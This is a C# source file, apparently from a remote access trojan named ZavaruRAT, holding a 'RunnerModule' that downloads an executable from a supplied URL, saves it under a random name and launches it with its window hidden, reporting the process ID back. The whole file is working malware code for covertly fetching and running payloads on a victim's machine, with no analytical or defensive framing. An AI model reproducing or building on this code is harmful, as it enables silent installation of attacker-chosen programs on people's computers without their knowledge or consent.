#region

using System.Diagnostics;
using ZavaruRAT.Client.Sdk;

#endregion

namespace ZavaruRAT.Client.Modules;

public sealed class RunnerModule : ModuleBase
{
    private static readonly HttpClient HttpClient = new();

    public async Task<ExecutionResult> Run(string url)
    {
        var path = Path.Combine(Installation.ExecutableFolder, Guid.NewGuid() + ".exe");
        var f = File.OpenWrite(path);
        var res = await HttpClient.GetStreamAsync(url);
        await res.CopyToAsync(f);
        f.Close();
        res.Close();

        var proc = Process.Start(new ProcessStartInfo
        {
            FileName = path,
            CreateNoWindow = true,
            UseShellExecute = true,
            WindowStyle = ProcessWindowStyle.Hidden
        });

        return new ExecutionResult
        {
            Result = $"{proc?.Id}"
        };
    }
}
